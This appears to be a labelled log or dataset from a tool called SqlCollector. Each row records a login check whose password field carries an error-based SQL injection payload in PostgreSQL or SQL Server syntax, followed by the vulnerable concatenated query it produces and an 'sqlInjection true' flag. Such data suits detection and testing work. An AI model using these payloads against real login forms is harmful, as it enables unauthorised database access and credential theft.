SqlCollector	verifyPassword	name--KEY_VALUE_SEPARATOR--fakeuser--PARAM_SEPARATOR--password--KEY_VALUE_SEPARATOR--Demo12345' AND 4429=CAST(CHR(58)||CHR(104)||CHR(110)||CHR(120)||CHR(58)||(SELECT (CASE WHEN (4429=4429) THEN 1 ELSE 0 END))::text||CHR(58)||CHR(108)||CHR(110)||CHR(97)||CHR(58) AS NUMERIC)	id--KEY_VALUE_SEPARATOR--null	inputValid--KEY_VALUE_SEPARATOR--false	outputValid--KEY_VALUE_SEPARATOR--false	sqlQuery--KEY_VALUE_SEPARATOR--SELECT id FROM employees WHERE name='fakeuser' AND password='Demo12345' AND 4429=CAST(CHR(58)||CHR(104)||CHR(110)||CHR(120)||CHR(58)||(SELECT (CASE WHEN (4429=4429) THEN 1 ELSE 0 END))::text||CHR(58)||CHR(108)||CHR(110)||CHR(97)||CHR(58) AS NUMERIC)';	sqlInjection--KEY_VALUE_SEPARATOR--true
SqlCollector	verifyPassword	name--KEY_VALUE_SEPARATOR--fakeuser--PARAM_SEPARATOR--password--KEY_VALUE_SEPARATOR--Demo12345" AND 4429=CAST(CHR(58)||CHR(104)||CHR(110)||CHR(120)||CHR(58)||(SELECT (CASE WHEN (4429=4429) THEN 1 ELSE 0 END))::text||CHR(58)||CHR(108)||CHR(110)||CHR(97)||CHR(58) AS NUMERIC)	id--KEY_VALUE_SEPARATOR--null	inputValid--KEY_VALUE_SEPARATOR--false	outputValid--KEY_VALUE_SEPARATOR--false	sqlQuery--KEY_VALUE_SEPARATOR--SELECT id FROM employees WHERE name='fakeuser' AND password='Demo12345" AND 4429=CAST(CHR(58)||CHR(104)||CHR(110)||CHR(120)||CHR(58)||(SELECT (CASE WHEN (4429=4429) THEN 1 ELSE 0 END))::text||CHR(58)||CHR(108)||CHR(110)||CHR(97)||CHR(58) AS NUMERIC)';	sqlInjection--KEY_VALUE_SEPARATOR--true
SqlCollector	verifyPassword	name--KEY_VALUE_SEPARATOR--fakeuser--PARAM_SEPARATOR--password--KEY_VALUE_SEPARATOR--Demo12345) AND 4429=CAST(CHR(58)||CHR(104)||CHR(110)||CHR(120)||CHR(58)||(SELECT (CASE WHEN (4429=4429) THEN 1 ELSE 0 END))::text||CHR(58)||CHR(108)||CHR(110)||CHR(97)||CHR(58) AS NUMERIC) AND (7020=7020	id--KEY_VALUE_SEPARATOR--null	inputValid--KEY_VALUE_SEPARATOR--false	outputValid--KEY_VALUE_SEPARATOR--false	sqlQuery--KEY_VALUE_SEPARATOR--SELECT id FROM employees WHERE name='fakeuser' AND password='Demo12345) AND 4429=CAST(CHR(58)||CHR(104)||CHR(110)||CHR(120)||CHR(58)||(SELECT (CASE WHEN (4429=4429) THEN 1 ELSE 0 END))::text||CHR(58)||CHR(108)||CHR(110)||CHR(97)||CHR(58) AS NUMERIC) AND (7020=7020';	sqlInjection--KEY_VALUE_SEPARATOR--true
SqlCollector	verifyPassword	name--KEY_VALUE_SEPARATOR--fakeuser--PARAM_SEPARATOR--password--KEY_VALUE_SEPARATOR--Demo12345)) AND 4429=CAST(CHR(58)||CHR(104)||CHR(110)||CHR(120)||CHR(58)||(SELECT (CASE WHEN (4429=4429) THEN 1 ELSE 0 END))::text||CHR(58)||CHR(108)||CHR(110)||CHR(97)||CHR(58) AS NUMERIC) AND ((3379=3379	id--KEY_VALUE_SEPARATOR--null	inputValid--KEY_VALUE_SEPARATOR--false	outputValid--KEY_VALUE_SEPARATOR--false	sqlQuery--KEY_VALUE_SEPARATOR--SELECT id FROM employees WHERE name='fakeuser' AND password='Demo12345)) AND 4429=CAST(CHR(58)||CHR(104)||CHR(110)||CHR(120)||CHR(58)||(SELECT (CASE WHEN (4429=4429) THEN 1 ELSE 0 END))::text||CHR(58)||CHR(108)||CHR(110)||CHR(97)||CHR(58) AS NUMERIC) AND ((3379=3379';	sqlInjection--KEY_VALUE_SEPARATOR--true
SqlCollector	verifyPassword	name--KEY_VALUE_SEPARATOR--fakeuser--PARAM_SEPARATOR--password--KEY_VALUE_SEPARATOR--Demo12345))) AND 4429=CAST(CHR(58)||CHR(104)||CHR(110)||CHR(120)||CHR(58)||(SELECT (CASE WHEN (4429=4429) THEN 1 ELSE 0 END))::text||CHR(58)||CHR(108)||CHR(110)||CHR(97)||CHR(58) AS NUMERIC) AND (((7726=7726	id--KEY_VALUE_SEPARATOR--null	inputValid--KEY_VALUE_SEPARATOR--false	outputValid--KEY_VALUE_SEPARATOR--false	sqlQuery--KEY_VALUE_SEPARATOR--SELECT id FROM employees WHERE name='fakeuser' AND password='Demo12345))) AND 4429=CAST(CHR(58)||CHR(104)||CHR(110)||CHR(120)||CHR(58)||(SELECT (CASE WHEN (4429=4429) THEN 1 ELSE 0 END))::text||CHR(58)||CHR(108)||CHR(110)||CHR(97)||CHR(58) AS NUMERIC) AND (((7726=7726';	sqlInjection--KEY_VALUE_SEPARATOR--true
SqlCollector	verifyPassword	name--KEY_VALUE_SEPARATOR--fakeuser--PARAM_SEPARATOR--password--KEY_VALUE_SEPARATOR--Demo12345 AND 4429=CAST(CHR(58)||CHR(104)||CHR(110)||CHR(120)||CHR(58)||(SELECT (CASE WHEN (4429=4429) THEN 1 ELSE 0 END))::text||CHR(58)||CHR(108)||CHR(110)||CHR(97)||CHR(58) AS NUMERIC)	id--KEY_VALUE_SEPARATOR--null	inputValid--KEY_VALUE_SEPARATOR--false	outputValid--KEY_VALUE_SEPARATOR--false	sqlQuery--KEY_VALUE_SEPARATOR--SELECT id FROM employees WHERE name='fakeuser' AND password='Demo12345 AND 4429=CAST(CHR(58)||CHR(104)||CHR(110)||CHR(120)||CHR(58)||(SELECT (CASE WHEN (4429=4429) THEN 1 ELSE 0 END))::text||CHR(58)||CHR(108)||CHR(110)||CHR(97)||CHR(58) AS NUMERIC)';	sqlInjection--KEY_VALUE_SEPARATOR--true
SqlCollector	verifyPassword	name--KEY_VALUE_SEPARATOR--fakeuser--PARAM_SEPARATOR--password--KEY_VALUE_SEPARATOR--Demo12345') AND 4429=CAST(CHR(58)||CHR(104)||CHR(110)||CHR(120)||CHR(58)||(SELECT (CASE WHEN (4429=4429) THEN 1 ELSE 0 END))::text||CHR(58)||CHR(108)||CHR(110)||CHR(97)||CHR(58) AS NUMERIC) AND ('MIhK'='MIhK	id--KEY_VALUE_SEPARATOR--null	inputValid--KEY_VALUE_SEPARATOR--false	outputValid--KEY_VALUE_SEPARATOR--false	sqlQuery--KEY_VALUE_SEPARATOR--SELECT id FROM employees WHERE name='fakeuser' AND password='Demo12345') AND 4429=CAST(CHR(58)||CHR(104)||CHR(110)||CHR(120)||CHR(58)||(SELECT (CASE WHEN (4429=4429) THEN 1 ELSE 0 END))::text||CHR(58)||CHR(108)||CHR(110)||CHR(97)||CHR(58) AS NUMERIC) AND ('MIhK'='MIhK';	sqlInjection--KEY_VALUE_SEPARATOR--true
SqlCollector	verifyPassword	name--KEY_VALUE_SEPARATOR--fakeuser--PARAM_SEPARATOR--password--KEY_VALUE_SEPARATOR--Demo12345')) AND 4429=CAST(CHR(58)||CHR(104)||CHR(110)||CHR(120)||CHR(58)||(SELECT (CASE WHEN (4429=4429) THEN 1 ELSE 0 END))::text||CHR(58)||CHR(108)||CHR(110)||CHR(97)||CHR(58) AS NUMERIC) AND (('CWIY'='CWIY	id--KEY_VALUE_SEPARATOR--null	inputValid--KEY_VALUE_SEPARATOR--false	outputValid--KEY_VALUE_SEPARATOR--false	sqlQuery--KEY_VALUE_SEPARATOR--SELECT id FROM employees WHERE name='fakeuser' AND password='Demo12345')) AND 4429=CAST(CHR(58)||CHR(104)||CHR(110)||CHR(120)||CHR(58)||(SELECT (CASE WHEN (4429=4429) THEN 1 ELSE 0 END))::text||CHR(58)||CHR(108)||CHR(110)||CHR(97)||CHR(58) AS NUMERIC) AND (('CWIY'='CWIY';	sqlInjection--KEY_VALUE_SEPARATOR--true
SqlCollector	verifyPassword	name--KEY_VALUE_SEPARATOR--fakeuser--PARAM_SEPARATOR--password--KEY_VALUE_SEPARATOR--Demo12345'))) AND 4429=CAST(CHR(58)||CHR(104)||CHR(110)||CHR(120)||CHR(58)||(SELECT (CASE WHEN (4429=4429) THEN 1 ELSE 0 END))::text||CHR(58)||CHR(108)||CHR(110)||CHR(97)||CHR(58) AS NUMERIC) AND ((('uOFE'='uOFE	id--KEY_VALUE_SEPARATOR--null	inputValid--KEY_VALUE_SEPARATOR--false	outputValid--KEY_VALUE_SEPARATOR--false	sqlQuery--KEY_VALUE_SEPARATOR--SELECT id FROM employees WHERE name='fakeuser' AND password='Demo12345'))) AND 4429=CAST(CHR(58)||CHR(104)||CHR(110)||CHR(120)||CHR(58)||(SELECT (CASE WHEN (4429=4429) THEN 1 ELSE 0 END))::text||CHR(58)||CHR(108)||CHR(110)||CHR(97)||CHR(58) AS NUMERIC) AND ((('uOFE'='uOFE';	sqlInjection--KEY_VALUE_SEPARATOR--true
SqlCollector	verifyPassword	name--KEY_VALUE_SEPARATOR--fakeuser--PARAM_SEPARATOR--password--KEY_VALUE_SEPARATOR--Demo12345' AND 4429=CAST(CHR(58)||CHR(104)||CHR(110)||CHR(120)||CHR(58)||(SELECT (CASE WHEN (4429=4429) THEN 1 ELSE 0 END))::text||CHR(58)||CHR(108)||CHR(110)||CHR(97)||CHR(58) AS NUMERIC) AND 'dGex'='dGex	id--KEY_VALUE_SEPARATOR--null	inputValid--KEY_VALUE_SEPARATOR--false	outputValid--KEY_VALUE_SEPARATOR--false	sqlQuery--KEY_VALUE_SEPARATOR--SELECT id FROM employees WHERE name='fakeuser' AND password='Demo12345' AND 4429=CAST(CHR(58)||CHR(104)||CHR(110)||CHR(120)||CHR(58)||(SELECT (CASE WHEN (4429=4429) THEN 1 ELSE 0 END))::text||CHR(58)||CHR(108)||CHR(110)||CHR(97)||CHR(58) AS NUMERIC) AND 'dGex'='dGex';	sqlInjection--KEY_VALUE_SEPARATOR--true
SqlCollector	verifyPassword	name--KEY_VALUE_SEPARATOR--fakeuser--PARAM_SEPARATOR--password--KEY_VALUE_SEPARATOR--Demo12345') AND 4429=CAST(CHR(58)||CHR(104)||CHR(110)||CHR(120)||CHR(58)||(SELECT (CASE WHEN (4429=4429) THEN 1 ELSE 0 END))::text||CHR(58)||CHR(108)||CHR(110)||CHR(97)||CHR(58) AS NUMERIC) AND ('gDYz' LIKE 'gDYz	id--KEY_VALUE_SEPARATOR--null	inputValid--KEY_VALUE_SEPARATOR--false	outputValid--KEY_VALUE_SEPARATOR--false	sqlQuery--KEY_VALUE_SEPARATOR--SELECT id FROM employees WHERE name='fakeuser' AND password='Demo12345') AND 4429=CAST(CHR(58)||CHR(104)||CHR(110)||CHR(120)||CHR(58)||(SELECT (CASE WHEN (4429=4429) THEN 1 ELSE 0 END))::text||CHR(58)||CHR(108)||CHR(110)||CHR(97)||CHR(58) AS NUMERIC) AND ('gDYz' LIKE 'gDYz';	sqlInjection--KEY_VALUE_SEPARATOR--true
SqlCollector	verifyPassword	name--KEY_VALUE_SEPARATOR--fakeuser--PARAM_SEPARATOR--password--KEY_VALUE_SEPARATOR--Demo12345')) AND 4429=CAST(CHR(58)||CHR(104)||CHR(110)||CHR(120)||CHR(58)||(SELECT (CASE WHEN (4429=4429) THEN 1 ELSE 0 END))::text||CHR(58)||CHR(108)||CHR(110)||CHR(97)||CHR(58) AS NUMERIC) AND (('nYfQ' LIKE 'nYfQ	id--KEY_VALUE_SEPARATOR--null	inputValid--KEY_VALUE_SEPARATOR--false	outputValid--KEY_VALUE_SEPARATOR--false	sqlQuery--KEY_VALUE_SEPARATOR--SELECT id FROM employees WHERE name='fakeuser' AND password='Demo12345')) AND 4429=CAST(CHR(58)||CHR(104)||CHR(110)||CHR(120)||CHR(58)||(SELECT (CASE WHEN (4429=4429) THEN 1 ELSE 0 END))::text||CHR(58)||CHR(108)||CHR(110)||CHR(97)||CHR(58) AS NUMERIC) AND (('nYfQ' LIKE 'nYfQ';	sqlInjection--KEY_VALUE_SEPARATOR--true
SqlCollector	verifyPassword	name--KEY_VALUE_SEPARATOR--fakeuser--PARAM_SEPARATOR--password--KEY_VALUE_SEPARATOR--Demo12345'))) AND 4429=CAST(CHR(58)||CHR(104)||CHR(110)||CHR(120)||CHR(58)||(SELECT (CASE WHEN (4429=4429) THEN 1 ELSE 0 END))::text||CHR(58)||CHR(108)||CHR(110)||CHR(97)||CHR(58) AS NUMERIC) AND ((('xdRO' LIKE 'xdRO	id--KEY_VALUE_SEPARATOR--null	inputValid--KEY_VALUE_SEPARATOR--false	outputValid--KEY_VALUE_SEPARATOR--false	sqlQuery--KEY_VALUE_SEPARATOR--SELECT id FROM employees WHERE name='fakeuser' AND password='Demo12345'))) AND 4429=CAST(CHR(58)||CHR(104)||CHR(110)||CHR(120)||CHR(58)||(SELECT (CASE WHEN (4429=4429) THEN 1 ELSE 0 END))::text||CHR(58)||CHR(108)||CHR(110)||CHR(97)||CHR(58) AS NUMERIC) AND ((('xdRO' LIKE 'xdRO';	sqlInjection--KEY_VALUE_SEPARATOR--true
SqlCollector	verifyPassword	name--KEY_VALUE_SEPARATOR--fakeuser--PARAM_SEPARATOR--password--KEY_VALUE_SEPARATOR--Demo12345' AND 4429=CAST(CHR(58)||CHR(104)||CHR(110)||CHR(120)||CHR(58)||(SELECT (CASE WHEN (4429=4429) THEN 1 ELSE 0 END))::text||CHR(58)||CHR(108)||CHR(110)||CHR(97)||CHR(58) AS NUMERIC) AND 'KRVm' LIKE 'KRVm	id--KEY_VALUE_SEPARATOR--null	inputValid--KEY_VALUE_SEPARATOR--false	outputValid--KEY_VALUE_SEPARATOR--false	sqlQuery--KEY_VALUE_SEPARATOR--SELECT id FROM employees WHERE name='fakeuser' AND password='Demo12345' AND 4429=CAST(CHR(58)||CHR(104)||CHR(110)||CHR(120)||CHR(58)||(SELECT (CASE WHEN (4429=4429) THEN 1 ELSE 0 END))::text||CHR(58)||CHR(108)||CHR(110)||CHR(97)||CHR(58) AS NUMERIC) AND 'KRVm' LIKE 'KRVm';	sqlInjection--KEY_VALUE_SEPARATOR--true
SqlCollector	verifyPassword	name--KEY_VALUE_SEPARATOR--fakeuser--PARAM_SEPARATOR--password--KEY_VALUE_SEPARATOR--Demo12345") AND 4429=CAST(CHR(58)||CHR(104)||CHR(110)||CHR(120)||CHR(58)||(SELECT (CASE WHEN (4429=4429) THEN 1 ELSE 0 END))::text||CHR(58)||CHR(108)||CHR(110)||CHR(97)||CHR(58) AS NUMERIC) AND ("Zvcb"="Zvcb	id--KEY_VALUE_SEPARATOR--null	inputValid--KEY_VALUE_SEPARATOR--false	outputValid--KEY_VALUE_SEPARATOR--false	sqlQuery--KEY_VALUE_SEPARATOR--SELECT id FROM employees WHERE name='fakeuser' AND password='Demo12345") AND 4429=CAST(CHR(58)||CHR(104)||CHR(110)||CHR(120)||CHR(58)||(SELECT (CASE WHEN (4429=4429) THEN 1 ELSE 0 END))::text||CHR(58)||CHR(108)||CHR(110)||CHR(97)||CHR(58) AS NUMERIC) AND ("Zvcb"="Zvcb';	sqlInjection--KEY_VALUE_SEPARATOR--true
SqlCollector	verifyPassword	name--KEY_VALUE_SEPARATOR--fakeuser--PARAM_SEPARATOR--password--KEY_VALUE_SEPARATOR--Demo12345")) AND 4429=CAST(CHR(58)||CHR(104)||CHR(110)||CHR(120)||CHR(58)||(SELECT (CASE WHEN (4429=4429) THEN 1 ELSE 0 END))::text||CHR(58)||CHR(108)||CHR(110)||CHR(97)||CHR(58) AS NUMERIC) AND (("BdSo"="BdSo	id--KEY_VALUE_SEPARATOR--null	inputValid--KEY_VALUE_SEPARATOR--false	outputValid--KEY_VALUE_SEPARATOR--false	sqlQuery--KEY_VALUE_SEPARATOR--SELECT id FROM employees WHERE name='fakeuser' AND password='Demo12345")) AND 4429=CAST(CHR(58)||CHR(104)||CHR(110)||CHR(120)||CHR(58)||(SELECT (CASE WHEN (4429=4429) THEN 1 ELSE 0 END))::text||CHR(58)||CHR(108)||CHR(110)||CHR(97)||CHR(58) AS NUMERIC) AND (("BdSo"="BdSo';	sqlInjection--KEY_VALUE_SEPARATOR--true
SqlCollector	verifyPassword	name--KEY_VALUE_SEPARATOR--fakeuser--PARAM_SEPARATOR--password--KEY_VALUE_SEPARATOR--Demo12345"))) AND 4429=CAST(CHR(58)||CHR(104)||CHR(110)||CHR(120)||CHR(58)||(SELECT (CASE WHEN (4429=4429) THEN 1 ELSE 0 END))::text||CHR(58)||CHR(108)||CHR(110)||CHR(97)||CHR(58) AS NUMERIC) AND ((("udRD"="udRD	id--KEY_VALUE_SEPARATOR--null	inputValid--KEY_VALUE_SEPARATOR--false	outputValid--KEY_VALUE_SEPARATOR--false	sqlQuery--KEY_VALUE_SEPARATOR--SELECT id FROM employees WHERE name='fakeuser' AND password='Demo12345"))) AND 4429=CAST(CHR(58)||CHR(104)||CHR(110)||CHR(120)||CHR(58)||(SELECT (CASE WHEN (4429=4429) THEN 1 ELSE 0 END))::text||CHR(58)||CHR(108)||CHR(110)||CHR(97)||CHR(58) AS NUMERIC) AND ((("udRD"="udRD';	sqlInjection--KEY_VALUE_SEPARATOR--true
SqlCollector	verifyPassword	name--KEY_VALUE_SEPARATOR--fakeuser--PARAM_SEPARATOR--password--KEY_VALUE_SEPARATOR--Demo12345" AND 4429=CAST(CHR(58)||CHR(104)||CHR(110)||CHR(120)||CHR(58)||(SELECT (CASE WHEN (4429=4429) THEN 1 ELSE 0 END))::text||CHR(58)||CHR(108)||CHR(110)||CHR(97)||CHR(58) AS NUMERIC) AND "nJVM"="nJVM	id--KEY_VALUE_SEPARATOR--null	inputValid--KEY_VALUE_SEPARATOR--false	outputValid--KEY_VALUE_SEPARATOR--false	sqlQuery--KEY_VALUE_SEPARATOR--SELECT id FROM employees WHERE name='fakeuser' AND password='Demo12345" AND 4429=CAST(CHR(58)||CHR(104)||CHR(110)||CHR(120)||CHR(58)||(SELECT (CASE WHEN (4429=4429) THEN 1 ELSE 0 END))::text||CHR(58)||CHR(108)||CHR(110)||CHR(97)||CHR(58) AS NUMERIC) AND "nJVM"="nJVM';	sqlInjection--KEY_VALUE_SEPARATOR--true
SqlCollector	verifyPassword	name--KEY_VALUE_SEPARATOR--fakeuser--PARAM_SEPARATOR--password--KEY_VALUE_SEPARATOR--Demo12345") AND 4429=CAST(CHR(58)||CHR(104)||CHR(110)||CHR(120)||CHR(58)||(SELECT (CASE WHEN (4429=4429) THEN 1 ELSE 0 END))::text||CHR(58)||CHR(108)||CHR(110)||CHR(97)||CHR(58) AS NUMERIC) AND ("FCcM" LIKE "FCcM	id--KEY_VALUE_SEPARATOR--null	inputValid--KEY_VALUE_SEPARATOR--false	outputValid--KEY_VALUE_SEPARATOR--false	sqlQuery--KEY_VALUE_SEPARATOR--SELECT id FROM employees WHERE name='fakeuser' AND password='Demo12345") AND 4429=CAST(CHR(58)||CHR(104)||CHR(110)||CHR(120)||CHR(58)||(SELECT (CASE WHEN (4429=4429) THEN 1 ELSE 0 END))::text||CHR(58)||CHR(108)||CHR(110)||CHR(97)||CHR(58) AS NUMERIC) AND ("FCcM" LIKE "FCcM';	sqlInjection--KEY_VALUE_SEPARATOR--true
SqlCollector	verifyPassword	name--KEY_VALUE_SEPARATOR--fakeuser--PARAM_SEPARATOR--password--KEY_VALUE_SEPARATOR--Demo12345")) AND 4429=CAST(CHR(58)||CHR(104)||CHR(110)||CHR(120)||CHR(58)||(SELECT (CASE WHEN (4429=4429) THEN 1 ELSE 0 END))::text||CHR(58)||CHR(108)||CHR(110)||CHR(97)||CHR(58) AS NUMERIC) AND (("zURU" LIKE "zURU	id--KEY_VALUE_SEPARATOR--null	inputValid--KEY_VALUE_SEPARATOR--false	outputValid--KEY_VALUE_SEPARATOR--false	sqlQuery--KEY_VALUE_SEPARATOR--SELECT id FROM employees WHERE name='fakeuser' AND password='Demo12345")) AND 4429=CAST(CHR(58)||CHR(104)||CHR(110)||CHR(120)||CHR(58)||(SELECT (CASE WHEN (4429=4429) THEN 1 ELSE 0 END))::text||CHR(58)||CHR(108)||CHR(110)||CHR(97)||CHR(58) AS NUMERIC) AND (("zURU" LIKE "zURU';	sqlInjection--KEY_VALUE_SEPARATOR--true
SqlCollector	verifyPassword	name--KEY_VALUE_SEPARATOR--fakeuser--PARAM_SEPARATOR--password--KEY_VALUE_SEPARATOR--Demo12345"))) AND 4429=CAST(CHR(58)||CHR(104)||CHR(110)||CHR(120)||CHR(58)||(SELECT (CASE WHEN (4429=4429) THEN 1 ELSE 0 END))::text||CHR(58)||CHR(108)||CHR(110)||CHR(97)||CHR(58) AS NUMERIC) AND ((("peuP" LIKE "peuP	id--KEY_VALUE_SEPARATOR--null	inputValid--KEY_VALUE_SEPARATOR--false	outputValid--KEY_VALUE_SEPARATOR--false	sqlQuery--KEY_VALUE_SEPARATOR--SELECT id FROM employees WHERE name='fakeuser' AND password='Demo12345"))) AND 4429=CAST(CHR(58)||CHR(104)||CHR(110)||CHR(120)||CHR(58)||(SELECT (CASE WHEN (4429=4429) THEN 1 ELSE 0 END))::text||CHR(58)||CHR(108)||CHR(110)||CHR(97)||CHR(58) AS NUMERIC) AND ((("peuP" LIKE "peuP';	sqlInjection--KEY_VALUE_SEPARATOR--true
SqlCollector	verifyPassword	name--KEY_VALUE_SEPARATOR--fakeuser--PARAM_SEPARATOR--password--KEY_VALUE_SEPARATOR--Demo12345" AND 4429=CAST(CHR(58)||CHR(104)||CHR(110)||CHR(120)||CHR(58)||(SELECT (CASE WHEN (4429=4429) THEN 1 ELSE 0 END))::text||CHR(58)||CHR(108)||CHR(110)||CHR(97)||CHR(58) AS NUMERIC) AND "lYmv" LIKE "lYmv	id--KEY_VALUE_SEPARATOR--null	inputValid--KEY_VALUE_SEPARATOR--false	outputValid--KEY_VALUE_SEPARATOR--false	sqlQuery--KEY_VALUE_SEPARATOR--SELECT id FROM employees WHERE name='fakeuser' AND password='Demo12345" AND 4429=CAST(CHR(58)||CHR(104)||CHR(110)||CHR(120)||CHR(58)||(SELECT (CASE WHEN (4429=4429) THEN 1 ELSE 0 END))::text||CHR(58)||CHR(108)||CHR(110)||CHR(97)||CHR(58) AS NUMERIC) AND "lYmv" LIKE "lYmv';	sqlInjection--KEY_VALUE_SEPARATOR--true
SqlCollector	verifyPassword	name--KEY_VALUE_SEPARATOR--fakeuser--PARAM_SEPARATOR--password--KEY_VALUE_SEPARATOR--Demo12345) AND 1246=CONVERT(INT,(CHAR(58)+CHAR(104)+CHAR(110)+CHAR(120)+CHAR(58)+(SELECT (CASE WHEN (1246=1246) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(58)+CHAR(108)+CHAR(110)+CHAR(97)+CHAR(58)))	id--KEY_VALUE_SEPARATOR--null	inputValid--KEY_VALUE_SEPARATOR--false	outputValid--KEY_VALUE_SEPARATOR--false	sqlQuery--KEY_VALUE_SEPARATOR--SELECT id FROM employees WHERE name='fakeuser' AND password='Demo12345) AND 1246=CONVERT(INT,(CHAR(58)+CHAR(104)+CHAR(110)+CHAR(120)+CHAR(58)+(SELECT (CASE WHEN (1246=1246) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(58)+CHAR(108)+CHAR(110)+CHAR(97)+CHAR(58)))';	sqlInjection--KEY_VALUE_SEPARATOR--true
SqlCollector	verifyPassword	name--KEY_VALUE_SEPARATOR--fakeuser--PARAM_SEPARATOR--password--KEY_VALUE_SEPARATOR--Demo12345') AND 1246=CONVERT(INT,(CHAR(58)+CHAR(104)+CHAR(110)+CHAR(120)+CHAR(58)+(SELECT (CASE WHEN (1246=1246) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(58)+CHAR(108)+CHAR(110)+CHAR(97)+CHAR(58)))	id--KEY_VALUE_SEPARATOR--null	inputValid--KEY_VALUE_SEPARATOR--false	outputValid--KEY_VALUE_SEPARATOR--false	sqlQuery--KEY_VALUE_SEPARATOR--SELECT id FROM employees WHERE name='fakeuser' AND password='Demo12345') AND 1246=CONVERT(INT,(CHAR(58)+CHAR(104)+CHAR(110)+CHAR(120)+CHAR(58)+(SELECT (CASE WHEN (1246=1246) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(58)+CHAR(108)+CHAR(110)+CHAR(97)+CHAR(58)))';	sqlInjection--KEY_VALUE_SEPARATOR--true
SqlCollector	verifyPassword	name--KEY_VALUE_SEPARATOR--fakeuser--PARAM_SEPARATOR--password--KEY_VALUE_SEPARATOR--Demo12345' AND 1246=CONVERT(INT,(CHAR(58)+CHAR(104)+CHAR(110)+CHAR(120)+CHAR(58)+(SELECT (CASE WHEN (1246=1246) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(58)+CHAR(108)+CHAR(110)+CHAR(97)+CHAR(58)))	id--KEY_VALUE_SEPARATOR--null	inputValid--KEY_VALUE_SEPARATOR--false	outputValid--KEY_VALUE_SEPARATOR--false	sqlQuery--KEY_VALUE_SEPARATOR--SELECT id FROM employees WHERE name='fakeuser' AND password='Demo12345' AND 1246=CONVERT(INT,(CHAR(58)+CHAR(104)+CHAR(110)+CHAR(120)+CHAR(58)+(SELECT (CASE WHEN (1246=1246) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(58)+CHAR(108)+CHAR(110)+CHAR(97)+CHAR(58)))';	sqlInjection--KEY_VALUE_SEPARATOR--true
SqlCollector	verifyPassword	name--KEY_VALUE_SEPARATOR--fakeuser--PARAM_SEPARATOR--password--KEY_VALUE_SEPARATOR--Demo12345" AND 1246=CONVERT(INT,(CHAR(58)+CHAR(104)+CHAR(110)+CHAR(120)+CHAR(58)+(SELECT (CASE WHEN (1246=1246) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(58)+CHAR(108)+CHAR(110)+CHAR(97)+CHAR(58)))	id--KEY_VALUE_SEPARATOR--null	inputValid--KEY_VALUE_SEPARATOR--false	outputValid--KEY_VALUE_SEPARATOR--false	sqlQuery--KEY_VALUE_SEPARATOR--SELECT id FROM employees WHERE name='fakeuser' AND password='Demo12345" AND 1246=CONVERT(INT,(CHAR(58)+CHAR(104)+CHAR(110)+CHAR(120)+CHAR(58)+(SELECT (CASE WHEN (1246=1246) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(58)+CHAR(108)+CHAR(110)+CHAR(97)+CHAR(58)))';	sqlInjection--KEY_VALUE_SEPARATOR--true
SqlCollector	verifyPassword	name--KEY_VALUE_SEPARATOR--fakeuser--PARAM_SEPARATOR--password--KEY_VALUE_SEPARATOR--Demo12345) AND 1246=CONVERT(INT,(CHAR(58)+CHAR(104)+CHAR(110)+CHAR(120)+CHAR(58)+(SELECT (CASE WHEN (1246=1246) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(58)+CHAR(108)+CHAR(110)+CHAR(97)+CHAR(58))) AND (1482=1482	id--KEY_VALUE_SEPARATOR--null	inputValid--KEY_VALUE_SEPARATOR--false	outputValid--KEY_VALUE_SEPARATOR--false	sqlQuery--KEY_VALUE_SEPARATOR--SELECT id FROM employees WHERE name='fakeuser' AND password='Demo12345) AND 1246=CONVERT(INT,(CHAR(58)+CHAR(104)+CHAR(110)+CHAR(120)+CHAR(58)+(SELECT (CASE WHEN (1246=1246) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(58)+CHAR(108)+CHAR(110)+CHAR(97)+CHAR(58))) AND (1482=1482';	sqlInjection--KEY_VALUE_SEPARATOR--true
